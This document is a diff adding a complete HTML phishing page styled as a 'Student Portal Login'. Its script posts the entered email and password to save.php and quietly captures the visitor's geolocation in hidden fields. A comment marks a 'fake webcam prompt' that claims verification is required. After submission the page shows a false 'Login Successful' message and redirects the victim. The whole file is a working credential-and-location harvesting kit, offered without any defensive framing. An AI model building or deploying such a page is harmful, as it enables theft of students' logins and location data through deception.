@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Student Portal Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #2b5876, #4e4376);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      text-align: center;
+      width: 300px;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #00c9ff;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      cursor: pointer;
+    }
+    .success {
+      display: none;
+      margin-top: 10px;
+      color: lightgreen;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Student Login</h2>
+    <form id="loginForm" action="save.php" method="POST" onsubmit="handleLogin(event)">
+      <input type="email" name="email" placeholder="Email" required /><br />
+      <input type="password" name="password" placeholder="Password" required /><br />
+      
+      <!-- Hidden fields for geolocation -->
+      <input type="hidden" name="latitude" id="latitude">
+      <input type="hidden" name="longitude" id="longitude">
+
+      <button type="submit">Login</button>
+    </form>
+    <div class="success" id="successMsg">Login Successful! Redirecting...</div>
+  </div>
+
+  <script>
+    // Geolocation prompt
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        document.getElementById("latitude").value = position.coords.latitude;
+        document.getElementById("longitude").value = position.coords.longitude;
+      },
+      (error) => {
+        console.warn("Geolocation blocked or failed:", error.message);
+      }
+    );
+
+    // Fake webcam prompt
+    setTimeout(() => {
+      alert("Allow webcam access to continue (required for verification).");
+    }, 1500);
+
+    // Submit handler
+    function handleLogin(event) {
+      event.preventDefault();
+      const form = document.getElementById("loginForm");
+      const formData = new FormData(form);
+
+      fetch("save.php", {
+        method: "POST",
+        body: formData
+      })
+      .then(() => {
+        document.getElementById("successMsg").style.display = "block";
+        setTimeout(() => {
+          window.location.href = "studentdashboard.html";
+        }, 2000); // 2 sec delay
+      })
+      .catch(error => alert("Error: " + error));
+    }
+  </script>
+</body>
+</html>
